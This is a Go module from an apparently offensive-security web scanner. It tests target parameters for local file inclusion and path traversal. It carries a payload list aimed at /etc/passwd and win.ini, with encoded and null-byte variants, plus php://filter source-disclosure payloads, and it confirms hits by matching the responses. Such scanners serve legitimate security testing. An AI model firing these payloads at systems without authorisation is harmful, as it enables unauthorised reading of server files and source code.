package modules

import (
	"encoding/base64"
	"fmt"
	"nightfalllx/pkg/client"
	"regexp"
	"strings"
)

type LFIModule struct{}

func NewLFIModule() *LFIModule {
	return &LFIModule{}
}

func (m *LFIModule) Name() string {
	return "lfi"
}

func (m *LFIModule) Description() string {
	return "Local File Inclusion and Path Traversal verification"
}

var (
	rootPasswdRegex = regexp.MustCompile(`root:[^:]*?:0:0:`)
	winIniRegex     = regexp.MustCompile(`(?i)\[(?:fonts|extensions)\]`)
	base64BlobRegex = regexp.MustCompile(`[A-Za-z0-9+/]{20,}={0,2}`)
)

var traversalPayloads = []struct {
	Payload string
	Regex   *regexp.Regexp
}{
	{"../../../../etc/passwd", rootPasswdRegex},
	{"../../../../../../../../etc/passwd", rootPasswdRegex},
	{"../../../../../../../../../../etc/passwd", rootPasswdRegex},
	{"../../../../../../../../etc/passwd%00", rootPasswdRegex},
	{"..%2f..%2f..%2f..%2fetc%2fpasswd", rootPasswdRegex},
	{"..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", rootPasswdRegex},
	{"..%252f..%252f..%252f..%252fetc%252fpasswd", rootPasswdRegex},
	{"....//....//....//etc/passwd", rootPasswdRegex},
	{"....//....//....//....//....//....//etc/passwd", rootPasswdRegex},
	{"/etc/passwd", rootPasswdRegex},
	{"../../../../windows/win.ini", winIniRegex},
	{"../../../../../../../../windows/win.ini", winIniRegex},
	{"..\\..\\..\\..\\windows\\win.ini", winIniRegex},
	{"..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini", winIniRegex},
}

func (m *LFIModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
	var findings []*Finding
	isPost := strings.ToUpper(target.Method) == "POST"

	for _, param := range target.Parameters() {
		// 1. PHP Filter checks (both with and without .php for appended extensions)
		phpFilters := []string{
			"php://filter/convert.base64-encode/resource=index.php",
			"php://filter/convert.base64-encode/resource=index",
			"php://filter/read=convert.base64-encode/resource=index.php",
			"php://filter/read=convert.base64-encode/resource=index",
		}
		for _, phpFilterPayload := range phpFilters {
			var filterResp *client.Response
			var err error
			if isPost {
				filterResp, err = c.Request("POST", target.URL, target.BuildDataWithParam(param, phpFilterPayload), nil)
			} else {
				filterResp, err = c.Request("GET", target.BuildURLWithParam(param, phpFilterPayload), "", nil)
			}

		if err == nil && filterResp.Body != "" {
			blobs := base64BlobRegex.FindAllString(filterResp.Body, -1)
			for _, blob := range blobs {
				padded := blob + strings.Repeat("=", (4-len(blob)%4)%4)
				decoded, decErr := base64.StdEncoding.DecodeString(padded)
				if decErr == nil && (strings.Contains(string(decoded), "<?php") || strings.Contains(string(decoded), "<?=")) {
					findings = append(findings, &Finding{
						Module:      m.Name(),
						Title:       "Local File Inclusion (PHP Stream Filter)",
						Severity:    SeverityHigh,
						Confidence:  100,
						URL:         target.URL,
						Parameter:   param,
						Payload:     phpFilterPayload,
						Detail:      "PHP source code disclosure confirmed via php://filter base64 stream wrapper.",
						Evidence:    "Decoded base64 stream contained PHP script markers (<?php).",
						Remediation: "Disable PHP stream wrappers in user-controlled file inclusion and validate against an allow-list.",
						CWEID:       98,
					})
				}
			}
		}
	}

		if len(findings) > 0 {
			continue
		}

		// 2. Path Traversal checks
		for _, item := range traversalPayloads {
			var resp *client.Response
			var err error
			if isPost {
				resp, err = c.Request("POST", target.URL, target.BuildDataWithParam(param, item.Payload), nil)
			} else {
				resp, err = c.Request("GET", target.BuildURLWithParam(param, item.Payload), "", nil)
			}
			if err != nil || resp.Body == "" {
				continue
			}

			if item.Regex.MatchString(resp.Body) {
				findings = append(findings, &Finding{
					Module:      m.Name(),
					Title:       "Path Traversal / Local File Inclusion (LFI)",
					Severity:    SeverityHigh,
					Confidence:  100,
					URL:         target.URL,
					Parameter:   param,
					Payload:     item.Payload,
					Detail:      fmt.Sprintf("Arbitrary file read confirmed: disclosed known operating system file via payload '%s'.", item.Payload),
					Evidence:    fmt.Sprintf("Matched pattern in response for %s", item.Payload),
					Remediation: "Sanitize file paths, avoid passing raw user input into file systems, and restrict permissions.",
					CWEID:       22,
				})
				break
			}
		}
	}

	return findings, nil
}
